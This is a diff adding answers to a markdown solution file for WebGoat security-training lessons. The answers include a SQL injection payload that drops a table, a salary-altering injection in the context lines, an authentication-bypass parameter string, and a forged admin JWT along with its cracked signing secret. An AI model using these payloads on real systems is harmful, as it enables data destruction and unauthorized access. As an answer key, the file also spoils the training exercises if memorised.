@@ -90,6 +90,42 @@ Smith
 3SL99A'; update employees SET salary = 90000 where first_name = 'John' and last_name = 'Smith 
 ```
 
+### 13
+
+```sql
+%'; DROP TABLE access_log;--
+```
+# A2
+
+## Authentication Bypasses
+
+### 2
+
+```
+secQuestion00=asd&secQuestion01=asd
+```
+
+## JWT
+
+### 4
+
+```
+victory
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1OTgxMzA5MjIsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.WOETTS9Ed14B7_O2_TCBmGDHHfUH0fNnQKMGCXm3BqU-Tz0dJ-DX2IAqQjOqKchNOLVLFLJ8j2MkjgzwoYEVkQ
+```
+
+### 5
+
+```
+business
+username: Webgoat
+adelantar el tiempo de expiracion
+```
+
+
+## JWT Tokens
+
+
 
 ## Access control flaws -  Guessing & Predicting Patterns
 
